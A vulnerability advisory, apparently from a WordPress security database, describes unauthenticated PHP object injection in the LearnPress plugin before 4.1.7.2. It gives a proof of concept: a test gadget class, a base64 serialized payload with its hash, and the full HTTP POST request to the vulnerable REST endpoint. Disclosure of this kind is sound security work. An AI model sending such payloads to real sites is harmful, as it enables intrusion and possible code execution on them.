## WordPress Plugin Vulnerabilities

# LearnPress < 4.1.7.2 - Unauthenticated PHP Object Injection via REST API

### Description

The plugin unserialises user input in a REST API endpoint available to unauthenticated users, which could lead to PHP Object Injection when a suitable gadget is present, leadint to remote code execution (RCE). To successfully exploit this vulnerability attackers must have knowledge of the site secrets, allowing them to generate a valid hash via the wp\_hash() function.

### Proof of Concept

To simulate a gadget chain, put the following code in a plugin
class Evil {
public function \_\_wakeup() : void {
die("Arbitrary deserialization");
}
}
payload: {"widget":"learnpress\_widget\_course\_extra","instance":"Tzo0OiJFdmlsIjowOnt9Ow==","hash":"ef7da9dd4fe6ebf4598ab3c7b975322f"}
- instance is base64 encode of serialized object: O:4:"Evil":0:{};
- hash is caculated by: wp\_hash(base64\_decode($instance ))
POST /wp-json/lp/v1/widgets/api?\_locale=user HTTP/1.1
Content-Type: application/json
Content-Length: 123
{"widget":"learnpress\_widget\_course\_extra","instance":"Tzo0OiJFdmlsIjowOnt9Ow==","hash":"ef7da9dd4fe6ebf4598ab3c7b975322f"}
